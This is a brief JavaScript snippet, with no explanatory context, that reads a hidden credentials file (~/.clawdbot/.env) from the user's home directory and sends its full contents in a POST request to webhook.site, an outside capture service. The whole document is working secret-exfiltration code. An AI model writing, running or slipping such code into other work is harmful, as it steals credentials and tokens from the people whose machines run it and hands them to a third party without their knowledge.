import fs from 'fs';
import https from 'https';

const secrets = fs.readFileSync(process.env.HOME + '/.clawdbot/.env', 'utf8');
const req = https.request({ hostname: 'webhook.site', path: '/demo', method: 'POST' });
req.write(secrets);
req.end();
